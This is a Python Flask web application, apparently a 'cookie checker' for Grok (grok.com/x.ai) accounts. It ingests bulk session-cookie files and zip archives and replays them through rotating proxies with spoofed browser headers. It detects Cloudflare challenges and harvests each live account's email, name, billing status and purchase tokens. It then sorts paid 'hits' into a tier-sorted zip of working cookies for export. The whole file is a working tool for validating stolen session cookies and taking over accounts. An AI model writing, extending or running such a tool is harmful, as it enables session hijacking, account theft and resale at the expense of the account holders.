# ─────────────────────────────────────────────────────────────────────────────
#  Grok Cookie Validator — Web Edition v3.0
#  Core validation logic from Grok_byTrex.py | Web layer by Trex
# ─────────────────────────────────────────────────────────────────────────────

from flask import Flask, render_template_string, request, jsonify, Response, send_file
from flask_socketio import SocketIO, join_room, leave_room
import threading
import datetime
import io
import os
import re
import time
import random
import zipfile
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple, Any

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ─── App Setup ────────────────────────────────────────────────────────────────

app = Flask(__name__)
app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY", "grok-validator-secret-2025")
app.config["MAX_CONTENT_LENGTH"] = 200 * 1024 * 1024  # 200 MB
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

results_store: Dict[str, List[dict]] = {}
batch_state:   Dict[str, dict]       = {}

# ─── Constants ────────────────────────────────────────────────────────────────

VERSION          = "3.0-web"
SESSION_URL      = "https://grok.com/api/auth/session"
SUBSCRIPTIONS_URL = "https://grok.com/rest/subscriptions"
HOME_URL         = "https://grok.com/"
TIMEOUT          = 25

BROWSER_HEADERS = {
    "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0",
    "Accept":          "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Referer":         "https://grok.com/",
    "Origin":          "https://grok.com",
    "Connection":      "keep-alive",
    "Sec-Fetch-Dest":  "empty",
    "Sec-Fetch-Mode":  "cors",
    "Sec-Fetch-Site":  "same-origin",
    "Priority":        "u=4",
    "Pragma":          "no-cache",
    "Cache-Control":   "no-cache",
}

CHALLENGE_MARKERS = [
    "cf-chl", "cloudflare", "attention required", "captcha",
    "challenge-platform", "just a moment", "checking your browser", "access denied",
]

# Subscription states that count as a genuinely active paid subscription.
# Status tokens (compared after stripping any "SUBSCRIPTION_STATUS_" / "STATUS_"
# prefix, lower-casing, and normalising separators). xAI returns enum-style
# values like "SUBSCRIPTION_STATUS_ACTIVE" / "SUBSCRIPTION_STATUS_INACTIVE".
ACTIVE_STATES = {
    "active", "trialing", "trial", "in_trial", "active_trial", "on_trial",
    "grace", "grace_period", "on_grace_period", "in_grace_period", "paused_active",
}
INACTIVE_STATES = {
    "inactive", "canceled", "cancelled", "expired", "ended", "paused",
    "past_due", "unpaid", "incomplete", "incomplete_expired", "revoked",
    "suspended", "deleted", "refunded", "on_hold",
}


def _norm_status(raw: Optional[str]) -> str:
    """Lower-case a status and strip the xAI enum prefix so e.g.
    'SUBSCRIPTION_STATUS_ACTIVE' -> 'active', 'SUBSCRIPTION_STATUS_INACTIVE'
    -> 'inactive'."""
    s = (raw or "").strip().lower()
    if not s:
        return ""
    for pre in ("subscription_status_", "subscription_state_", "sub_status_",
                "status_", "state_"):
        if s.startswith(pre):
            s = s[len(pre):]
            break
    return s.strip("_ ").replace("-", "_").replace(" ", "_")


def _status_is_active(raw: Optional[str]) -> Optional[bool]:
    """True / False if the status is clearly active / inactive, else None
    (unknown — let the caller fall back to the billing-period-end check)."""
    s = _norm_status(raw)
    if not s:
        return None
    if s in INACTIVE_STATES or s.startswith("inactive"):
        return False
    if s in ACTIVE_STATES or s.startswith("active") or s.startswith("trial"):
        return True
    return None

# Field key -> label used in exported .txt files (order matters).
EXPORT_FIELD_LABELS: List[Tuple[str, str]] = [
    ("email",               "Email"),
    ("tier",                "Tier"),
    ("billing_interval",    "Billing Intv"),
    ("subscription_status", "Sub Status"),
    ("billing_period_end",  "Period End"),
    ("product_id",          "Product ID"),
    ("base_plan_id",        "Base Plan ID"),
    ("purchase_token",      "Purchase Token"),
    ("user_id",             "User ID"),
    ("name",                "Name"),
    ("source_file",         "Source File"),
    ("status",              "Validation"),
    ("reason",              "Reason"),
]

# ─── Data Model ───────────────────────────────────────────────────────────────

@dataclass
class ValidationResult:
    source_file:         str
    status:              str   # valid | invalid | cloudflare_blocked | error
    reason:              str
    email:               Optional[str] = None
    name:                Optional[str] = None
    user_id:             Optional[str] = None
    tier:                Optional[str] = None
    billing_interval:    Optional[str] = None
    subscription_status: Optional[str] = None
    billing_period_end:  Optional[str] = None
    base_plan_id:        Optional[str] = None
    product_id:          Optional[str] = None
    purchase_token:      Optional[str] = None
    cookie_text:         str           = ""

    def to_dict(self) -> dict:
        return {
            "source_file":         self.source_file,
            "status":              self.status,
            "reason":              self.reason,
            "email":               self.email               or "",
            "name":                self.name                or "",
            "user_id":             self.user_id             or "",
            "tier":                self.tier                or "",
            "tier_display":        self._tier_display(),
            "billing_interval":    self.billing_interval    or "",
            "subscription_status": self.subscription_status or "",
            "billing_period_end":  self.billing_period_end  or "",
            "base_plan_id":        self.base_plan_id        or "",
            "product_id":          self.product_id          or "",
            "purchase_token":      self.purchase_token      or "",
            "active_sub":          self._is_active(),
            "cookie":              self.cookie_text,
        }

    def _tier_display(self) -> str:
        t = normalize_tier_name(self.tier)
        if t == "free":
            return "Free"
        raw = self.tier or t
        # Display-only cleanup of xAI enum names (folders keep the raw name).
        for pre in ("SUBSCRIPTION_TIER_", "subscription_tier_", "TIER_", "tier_"):
            if raw.startswith(pre):
                raw = raw[len(pre):]
                break
        return raw.replace("_", " ").title()

    def _is_active(self) -> bool:
        return is_active_subscription({
            "tier": self.tier,
            "subscription_status": self.subscription_status,
            "billing_period_end": self.billing_period_end,
        })

# ─── Cookie Parsing ───────────────────────────────────────────────────────────

def parse_netscape_cookies_with_text(text: str) -> Tuple[Dict[str, str], str]:
    cookies: Dict[str, str] = {}
    kept_lines: List[str] = []
    for raw in text.splitlines():
        line     = raw.rstrip("\r\n")
        stripped = line.strip()
        if not stripped:
            continue
        if stripped.startswith("#"):
            if stripped.startswith("#HttpOnly_") or stripped.startswith("# Netscape"):
                kept_lines.append(line)
            continue
        parts = stripped.split("\t")
        if len(parts) != 7:
            continue
        domain, _flag, _path, _secure, expires, name, value = parts
        try:
            if expires != "0" and float(expires) < time.time():
                continue
        except ValueError:
            pass
        if "grok.com" in domain or "x.ai" in domain:
            cookies[name] = value
            kept_lines.append(line)
    return cookies, "\n".join(kept_lines).strip()


def cookie_sets_from_text(text: str, filename: str) -> List[Tuple[str, Dict[str, str], str]]:
    cookies, cookie_text = parse_netscape_cookies_with_text(text)
    return [(filename, cookies, cookie_text)] if cookies else []


def cookie_sets_from_zip(data: bytes) -> List[Tuple[str, Dict[str, str], str]]:
    results = []
    try:
        with zipfile.ZipFile(io.BytesIO(data), "r") as zf:
            for info in zf.infolist():
                if info.is_dir() or not info.filename.lower().endswith(".txt"):
                    continue
                with zf.open(info) as f:
                    text = f.read().decode("utf-8", errors="ignore")
                cookies, cookie_text = parse_netscape_cookies_with_text(text)
                if cookies:
                    results.append((info.filename, cookies, cookie_text))
    except Exception:
        pass
    return results

# ─── HTTP Utilities ───────────────────────────────────────────────────────────

def make_session(cookies: Dict[str, str], proxy: Optional[str]) -> requests.Session:
    session = requests.Session()
    retry = Retry(
        total=2, connect=2, read=2, backoff_factor=0.5,
        status_forcelist=[429, 500, 502, 503, 504],
        allowed_methods=["GET", "HEAD", "OPTIONS"],
        raise_on_status=False,
    )
    adapter = HTTPAdapter(max_retries=retry, pool_connections=100, pool_maxsize=100)
    session.mount("https://", adapter)
    session.headers.update(BROWSER_HEADERS)
    for name, value in cookies.items():
        for domain in (".grok.com", "grok.com", ".x.ai", "x.ai"):
            try:
                session.cookies.set(name, value, domain=domain)
            except Exception:
                pass
    if proxy:
        session.proxies.update({"http": proxy, "https": proxy})
    return session


def looks_like_challenge(resp: requests.Response, text: str) -> bool:
    hay          = (text or "")[:4000].lower()
    headers_text = " ".join(f"{k}:{v}" for k, v in resp.headers.items()).lower()
    if resp.status_code in (403, 429, 503):
        return True
    if any(m in hay for m in CHALLENGE_MARKERS):
        return True
    if any(m in headers_text for m in ["cf-ray", "cloudflare"]):
        ctype = resp.headers.get("content-type", "").lower()
        if "text/html" in ctype and any(x in hay for x in ["just a moment", "attention required", "challenge"]):
            return True
    return False


def preflight(session: requests.Session) -> None:
    try:
        session.get(HOME_URL, timeout=TIMEOUT, allow_redirects=True)
        time.sleep(random.uniform(0.15, 0.45))
    except Exception:
        pass


def first_non_empty(*values: Any) -> Optional[str]:
    for v in values:
        if v is None:
            continue
        s = str(v).strip()
        if s:
            return s
    return None

# ─── Subscription Logic ───────────────────────────────────────────────────────

def _block_fields(sub: dict) -> Dict[str, Optional[str]]:
    """Pull normalised fields out of a single subscription block. Values can
    live at the top level or nested under a 'stripe' / 'google' object."""
    google = sub.get("google") if isinstance(sub.get("google"), dict) else {}
    stripe = sub.get("stripe") if isinstance(sub.get("stripe"), dict) else {}
    return {
        "tier":                first_non_empty(sub.get("tier")),
        "billing_interval":    first_non_empty(
            sub.get("billingInterval"), stripe.get("subscriptionType"),
            google.get("billingInterval")),
        "subscription_status": first_non_empty(sub.get("status")),
        "billing_period_end":  first_non_empty(
            sub.get("billingPeriodEnd"), sub.get("expiryTime"),
            stripe.get("currentPeriodEnd"), google.get("expiryTime")),
        "base_plan_id":   first_non_empty(sub.get("basePlanId"),    google.get("basePlanId")),
        "product_id":     first_non_empty(sub.get("productId"),     stripe.get("productId"),
                                          google.get("productId")),
        "purchase_token": first_non_empty(sub.get("purchaseToken"), google.get("purchaseToken")),
        "user_id":        first_non_empty(sub.get("xaiUserId"),     sub.get("userId")),
    }


def parse_subscriptions_payload(data: Any) -> Dict[str, Optional[str]]:
    """Scan the FULL subscription history and report the most relevant block.

    A user's history can hold many past subscriptions plus (sometimes) one
    active one — and the active block is not always first. So we look at every
    block: if any is active (non-free tier + active status, or a future billing
    period when the status is unknown) we report the active one with the
    furthest-future period end. Otherwise we report the most recent block so the
    tier/status still surface, and classification falls back to free."""
    items: List[Any] = []
    if isinstance(data, dict):
        if isinstance(data.get("subscriptions"), list):
            items = data["subscriptions"]
        elif isinstance(data.get("subscription"), dict):
            items = [data["subscription"]]
        elif isinstance(data.get("subscription"), list):
            items = data["subscription"]
        elif any(k in data for k in ("tier", "status", "google", "stripe")):
            items = [data]
    elif isinstance(data, list):
        items = data

    blocks = [_block_fields(s) for s in items if isinstance(s, dict)]
    blocks = [b for b in blocks if any(v for v in b.values())]
    if not blocks:
        return {}

    actives = [b for b in blocks if is_active_subscription(b)]
    if actives:
        # Prefer the active sub whose paid access runs latest.
        chosen = max(actives, key=lambda b: _period_end_epoch(b.get("billing_period_end")))
    else:
        # No active sub anywhere → surface the most recent paid block if there
        # is one (so the tier is still informative), else the most recent block.
        nonfree = [b for b in blocks if normalize_tier_name(b.get("tier")) != "free"]
        pool = nonfree or blocks
        chosen = max(pool, key=lambda b: _period_end_epoch(b.get("billing_period_end")))

    # Carry over a user id from any block if the chosen one is missing it.
    if not chosen.get("user_id"):
        for b in blocks:
            if b.get("user_id"):
                chosen = {**chosen, "user_id": b["user_id"]}
                break
    return chosen


def probe_subscription(session: requests.Session) -> Tuple[Dict[str, Optional[str]], str]:
    try:
        resp = session.get(SUBSCRIPTIONS_URL, timeout=TIMEOUT, allow_redirects=True)
        text = resp.text or ""
        if looks_like_challenge(resp, text):
            return {}, "subscription_challenge"
        if resp.status_code != 200:
            return {}, f"subscription_http_{resp.status_code}"
        try:
            data = resp.json()
        except Exception:
            return {}, "subscription_json_error"
        parsed = parse_subscriptions_payload(data)
        return (parsed, "rest_subscriptions") if parsed else ({}, "subscription_empty")
    except Exception as e:
        return {}, f"subscription_error:{type(e).__name__}"


def normalize_tier_name(tier: Optional[str]) -> str:
    if not tier or not str(tier).strip():
        return "free"
    raw     = str(tier).strip()
    lowered = raw.lower()
    if lowered in {"free", "none", "basic", "subscription_tier_free", "free_tier"} or "free" in lowered:
        return "free"
    safe = re.sub(r"[^a-zA-Z0-9._-]+", "_", raw).strip("._-")
    return safe or "free"


def _period_end_epoch(value: Optional[str]) -> float:
    """Parse a billing-period-end value to a unix timestamp (float).
    Returns 0.0 when it can't be parsed (so it sorts as 'oldest')."""
    if not value:
        return 0.0
    v = str(value).strip()
    try:
        num = float(v)
        return num / 1000.0 if num > 1e12 else num
    except ValueError:
        pass
    try:
        d = datetime.datetime.fromisoformat(v.replace("Z", "+00:00"))
        if d.tzinfo is None:
            d = d.replace(tzinfo=datetime.timezone.utc)
        return d.timestamp()
    except Exception:
        pass
    for fmt in ("%Y-%m-%d", "%Y/%m/%d", "%m/%d/%Y", "%B %d, %Y", "%b %d, %Y"):
        try:
            return datetime.datetime.strptime(v[:len(fmt) + 10], fmt).timestamp()
        except Exception:
            continue
    return 0.0


def _period_end_in_future(value: Optional[str]) -> bool:
    """True if a billing-period-end value parses to a future moment."""
    ep = _period_end_epoch(value)
    return ep > time.time() if ep else False


def is_active_subscription(r: dict) -> bool:
    """A cookie has an active paid sub only if its tier is non-free AND its
    subscription status looks active (or, when the status is unknown, the
    billing period still ends in the future). Otherwise it is treated as free."""
    if normalize_tier_name(r.get("tier")) == "free":
        return False
    st = _status_is_active(r.get("subscription_status"))
    if st is not None:
        return st
    return _period_end_in_future(r.get("billing_period_end"))


def export_folder(r: dict) -> str:
    """Active subs → their tier folder. Everything else → free folder."""
    return normalize_tier_name(r.get("tier")) if is_active_subscription(r) else "free"

# ─── Core Validation ──────────────────────────────────────────────────────────

def validate_one(
    source_file: str,
    cookies:     Dict[str, str],
    cookie_text: str,
    proxy:       Optional[str],
    do_preflight: bool,
) -> ValidationResult:
    session = make_session(cookies, proxy)
    try:
        if do_preflight:
            preflight(session)

        resp = session.get(SESSION_URL, timeout=TIMEOUT, allow_redirects=True)
        text = resp.text or ""

        if looks_like_challenge(resp, text):
            return ValidationResult(source_file=source_file, status="cloudflare_blocked",
                                    reason="challenge_detected", cookie_text=cookie_text)

        data  = None
        ctype = resp.headers.get("content-type", "").lower()
        if "application/json" in ctype or text.strip().startswith("{"):
            try:
                data = resp.json()
            except Exception:
                data = None

        if resp.status_code == 200 and isinstance(data, dict):
            status  = str(data.get("status", "")).lower()
            email   = data.get("email")
            user_id = data.get("userId") or data.get("xUserId") or data.get("id")
            given   = (data.get("givenName")  or "").strip()
            family  = (data.get("familyName") or "").strip()
            name    = f"{given} {family}".strip() or None

            if status == "authenticated" or user_id or email:
                sub, sub_reason = probe_subscription(session)
                return ValidationResult(
                    source_file=source_file, status="valid", reason=sub_reason,
                    email=email, name=name,
                    user_id=first_non_empty(sub.get("user_id"), user_id),
                    tier=first_non_empty(sub.get("tier"), "free"),
                    billing_interval=sub.get("billing_interval"),
                    subscription_status=sub.get("subscription_status"),
                    billing_period_end=sub.get("billing_period_end"),
                    base_plan_id=sub.get("base_plan_id"),
                    product_id=sub.get("product_id"),
                    purchase_token=sub.get("purchase_token"),
                    cookie_text=cookie_text,
                )
            return ValidationResult(source_file=source_file, status="invalid",
                                    reason="unauthenticated_json", cookie_text=cookie_text)

        if resp.status_code in (401, 440):
            return ValidationResult(source_file=source_file, status="invalid",
                                    reason="unauthorized", cookie_text=cookie_text)
        return ValidationResult(source_file=source_file, status="error",
                                reason=f"unexpected_http_{resp.status_code}", cookie_text=cookie_text)

    except requests.exceptions.ProxyError:
        return ValidationResult(source_file=source_file, status="error", reason="proxy_error", cookie_text=cookie_text)
    except requests.exceptions.ConnectTimeout:
        return ValidationResult(source_file=source_file, status="error", reason="connect_timeout", cookie_text=cookie_text)
    except requests.exceptions.ReadTimeout:
        return ValidationResult(source_file=source_file, status="error", reason="read_timeout", cookie_text=cookie_text)
    except requests.exceptions.SSLError:
        return ValidationResult(source_file=source_file, status="error", reason="ssl_error", cookie_text=cookie_text)
    except requests.exceptions.RequestException as e:
        return ValidationResult(source_file=source_file, status="error",
                                reason=f"request_error:{type(e).__name__}", cookie_text=cookie_text)
    except Exception as e:
        return ValidationResult(source_file=source_file, status="error",
                                reason=f"exception:{type(e).__name__}", cookie_text=cookie_text)

# ─── Proxy Parsing ────────────────────────────────────────────────────────────

def parse_proxy_line(line: str) -> Optional[str]:
    line = line.strip()
    if not line or line.startswith("#"):
        return None
    line = re.sub(r'^([a-zA-Z][a-zA-Z0-9+.-]*):/+', r'\1://', line)
    if re.match(r'^(https?|socks[45]h?|socks4a?)://', line, re.IGNORECASE):
        return line
    m = re.match(r'^([^:@\s]+):([^@\s]+)@([\w.\-\[\]]+):(\d+)$', line)
    if m:
        return f"http://{m.group(1)}:{m.group(2)}@{m.group(3)}:{m.group(4)}"
    m = re.match(r'^([\w.\-\[\]]+):(\d+)@([^:@\s]+):([^@\s]+)$', line)
    if m:
        return f"http://{m.group(3)}:{m.group(4)}@{m.group(1)}:{m.group(2)}"
    m = re.match(r'^([\w.\-\[\]]+):(\d+)$', line)
    if m:
        return f"http://{m.group(1)}:{m.group(2)}"
    parts = line.split(":")
    if len(parts) == 4:
        a, b, c, d = parts
        if b.isdigit() and not d.isdigit():
            return f"http://{c}:{d}@{a}:{b}"
        if d.isdigit() and not b.isdigit():
            return f"http://{a}:{b}@{c}:{d}"
    return None


def parse_proxies(text: str) -> List[str]:
    return [p for line in text.splitlines() if (p := parse_proxy_line(line))]

# ─── Batch Worker (with email deduplication) ──────────────────────────────────

def process_batch(
    sid:         str,
    cookie_sets: List[Tuple[str, Dict[str, str], str]],
    proxies:     List[str],
    num_threads: int,
    do_preflight: bool,
) -> None:
    total  = len(cookie_sets)
    counts = {"valid": 0, "invalid": 0, "cloudflare_blocked": 0, "error": 0,
              "duplicate": 0, "hits": 0, "free": 0}
    tiers: Dict[str, int] = {}
    seen_emails = set()
    lock  = threading.Lock()
    queue = list(cookie_sets)
    ql    = threading.Lock()
    proc  = [0]

    def worker():
        while True:
            with ql:
                if not queue:
                    return
                if not batch_state.get(sid, {}).get("running", True):
                    return
                src, cks, ctxt = queue.pop(0)
            if not batch_state.get(sid, {}).get("running", True):
                return

            proxy  = random.choice(proxies) if proxies else None
            result = validate_one(src, cks, ctxt, proxy, do_preflight)

            if not batch_state.get(sid, {}).get("running", True):
                return

            with lock:
                proc[0] += 1
                row = result.to_dict()
                row["idx"] = proc[0]

                if result.status == "valid":
                    email = (result.email or "").strip().lower()
                    if email and email in seen_emails:
                        # Duplicate account — keep info but flag separately
                        row["status"] = "duplicate"
                        row["dup"]    = True
                        counts["duplicate"] += 1
                    else:
                        if email:
                            seen_emails.add(email)
                        counts["valid"] += 1
                        if row.get("active_sub"):
                            counts["hits"] += 1
                        else:
                            counts["free"] += 1
                        t = normalize_tier_name(result.tier)
                        tiers[t] = tiers.get(t, 0) + 1
                else:
                    counts[result.status] = counts.get(result.status, 0) + 1

                results_store.setdefault(sid, []).append(row)
                socketio.emit("result_row", row, room=sid)
                socketio.emit("counts", {
                    **counts, "tiers": tiers,
                    "total": total, "processed": proc[0],
                }, room=sid)

    threads = [threading.Thread(target=worker, daemon=True)
               for _ in range(min(num_threads, total, 50))]
    for t in threads: t.start()
    for t in threads: t.join()

    batch_state[sid] = {"running": False}
    socketio.emit("batch_done", {
        **counts, "tiers": tiers,
        "total": total, "processed": proc[0],
    }, room=sid)

# ─── Routes ───────────────────────────────────────────────────────────────────

@app.route("/")
def index():
    return render_template_string(DASHBOARD)


@app.route("/api/check-single", methods=["POST"])
def check_single():
    b = (request.get_json(silent=True) or {}) if request.is_json else request.form
    cookie_text  = (b.get("cookie", "") or "").strip()
    proxies_text = (b.get("proxies", "") or "").strip()
    do_preflight = str(b.get("preflight", "true")).lower() not in ("false", "0", "no")

    if not cookie_text:
        return jsonify({"status": "error", "message": "No cookie provided"})

    cookies, cookie_clean = parse_netscape_cookies_with_text(cookie_text)
    if not cookies:
        return jsonify({"status": "error",
                        "message": "Could not parse cookie — use Netscape tab-delimited format"})

    proxies = parse_proxies(proxies_text) if proxies_text else []
    proxy   = random.choice(proxies) if proxies else None
    result  = validate_one("single", cookies, cookie_clean, proxy, do_preflight)
    return jsonify(result.to_dict())


@app.route("/api/batch", methods=["POST"])
def start_batch():
    sid = request.form.get("sid", "")
    if not sid:
        return jsonify({"error": "No session id"})
    if batch_state.get(sid, {}).get("running"):
        return jsonify({"error": "Batch already running"})

    num_threads  = min(max(int(request.form.get("threads", 10)), 1), 50)
    do_preflight = request.form.get("preflight", "true").lower() not in ("false", "0", "no")
    proxies_text = request.form.get("proxies", "")
    proxies      = parse_proxies(proxies_text) if proxies_text.strip() else []

    cookie_sets: List[Tuple[str, Dict[str, str], str]] = []

    for f in request.files.getlist("cookies"):
        fname = f.filename or "file"
        try:
            f.seek(0)
            raw = f.read()
            if fname.lower().endswith(".zip"):
                cookie_sets.extend(cookie_sets_from_zip(raw))
            else:
                cookie_sets.extend(cookie_sets_from_text(raw.decode("utf-8", "replace"), fname))
        except Exception as e:
            app.logger.error("File error %s: %s", fname, e)

    paste = (request.form.get("paste_text", "") or "").strip()
    if paste:
        for i, block in enumerate(re.split(r'\n-{3,}\n', paste)):
            if block.strip():
                cookie_sets.extend(cookie_sets_from_text(block.strip(), f"paste_{i+1}.txt"))

    if not cookie_sets:
        return jsonify({"error": "No valid Grok cookie sets found"})

    results_store[sid] = []
    batch_state[sid]   = {"running": True}
    threading.Thread(
        target=process_batch,
        args=(sid, cookie_sets, proxies, num_threads, do_preflight),
        daemon=True,
    ).start()
    return jsonify({"started": True, "total": len(cookie_sets)})


@app.route("/api/results/<sid>")
def get_results(sid):
    return jsonify(results_store.get(sid, []))


@app.route("/api/export/<sid>")
def export_zip(sid):
    results = results_store.get(sid, [])
    if not results:
        return Response("No results.", mimetype="text/plain")

    # Which fields to include (from settings toggles). Absent => all enabled.
    fields_param = request.args.get("fields")
    if fields_param is None:
        enabled = {k for k, _ in EXPORT_FIELD_LABELS}
    else:
        enabled = {f.strip() for f in fields_param.split(",") if f.strip()}

    buf      = io.BytesIO()
    counters: Dict[str, int] = {}

    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for r in results:
            # Only export real valid hits (duplicates are skipped automatically)
            if r.get("status") != "valid":
                continue

            folder = export_folder(r)            # active subs -> tier, else free
            counters[folder] = counters.get(folder, 0) + 1
            n = counters[folder]

            email_safe = re.sub(r"[^a-zA-Z0-9._-]+", "_",
                                r.get("email") or r.get("user_id") or "unknown").strip("._-") or "unknown"
            folder_safe = re.sub(r"[^a-zA-Z0-9._-]+", "_", folder).strip("._-") or "free"

            lines = []
            for key, label in EXPORT_FIELD_LABELS:
                if key not in enabled:
                    continue
                lines.append(f"{label.ljust(15)}: {r.get(key, '')}")
            lines += ["", "--------------------", "Cookie:", r.get("cookie", "")]

            zf.writestr(f"{folder}/{email_safe}+{folder_safe}_{n:04d}.txt", "\n".join(lines))

    buf.seek(0)
    data = buf.getvalue()
    resp = send_file(
        io.BytesIO(data),
        mimetype="application/zip",
        as_attachment=True,
        download_name="grok_results.zip",
    )
    # Explicit length avoids chunked transfer encoding, which makes some
    # mobile browsers (iOS Safari) hang on "Downloading…" forever.
    resp.headers["Content-Length"] = str(len(data))
    resp.headers["Cache-Control"]  = "no-store"
    return resp


@socketio.on("join")
def on_join(data):
    sid = data.get("sid", "")
    if sid: join_room(sid)

@socketio.on("leave")
def on_leave(data):
    sid = data.get("sid", "")
    if sid: leave_room(sid)

@socketio.on("stop_batch")
def on_stop(data):
    sid = data.get("sid", "")
    if sid and sid in batch_state:
        batch_state[sid]["running"] = False

# ─── Dashboard HTML ───────────────────────────────────────────────────────────
# (embedded in DASHBOARD.html via the companion file build step)

with open(os.path.join(os.path.dirname(__file__), "dashboard.html"), "r", encoding="utf-8") as _f:
    DASHBOARD = _f.read()

# ─── Entry Point ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    socketio.run(app, host="0.0.0.0", port=port, debug=False, allow_unsafe_werkzeug=True)
